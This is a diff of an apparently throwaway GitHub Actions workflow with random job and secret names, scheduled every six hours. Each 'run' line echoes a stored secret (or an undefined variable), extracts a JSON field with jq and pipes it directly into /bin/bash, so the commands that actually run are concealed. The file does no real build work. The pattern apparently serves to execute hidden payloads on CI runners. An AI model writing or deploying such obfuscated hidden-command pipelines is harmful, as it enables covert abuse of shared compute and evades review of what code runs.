@@ -1,23 +1,29 @@
 name: xuntianzong2387
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 3/6 * * *'
-
+    - cron: '20 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xuntianzong2387
         env:
-          u18: ${{ secrets.u18 }}
+          jh338: ${{ secrets.jh338 }}
         run: |
-          echo $u18 | jq -r .bybua30332 | /bin/bash
-          echo $riwjb69 | jq -r .r87 | /bin/bash
-          echo $afvm0123 | jq -r .iopq413 | /bin/bash
-          echo $lazmz03477 | jq -r .ttya22221 | /bin/bash
-          echo $sog505 | jq -r .zaxs5 | /bin/bash
-          echo $mbrt433 | jq -r .rymot7 | /bin/bash
-          echo $oara7 | jq -r .s61 | /bin/bash
+          echo $jh338 | jq -r .hhukf5563 | /bin/bash
+          echo $jigt99880 | jq -r .zdbu91 | /bin/bash
+          echo $zer14 | jq -r .au250 | /bin/bash
+          echo $vosq429 | jq -r .jrf927 | /bin/bash
+          echo $qzo4292 | jq -r .mx53183 | /bin/bash
+          echo $tjbbh2 | jq -r .i68 | /bin/bash
+          echo $sme63441 | jq -r .s8 | /bin/bash
+          echo $sqxs217 | jq -r .cu23418 | /bin/bash
+          echo $b45 | jq -r .s29946 | /bin/bash
+          echo $pqgfg5 | jq -r .ac1 | /bin/bash
+          echo $ov03 | jq -r .m85 | /bin/bash
+          echo $g71 | jq -r .qtjp1 | /bin/bash
 
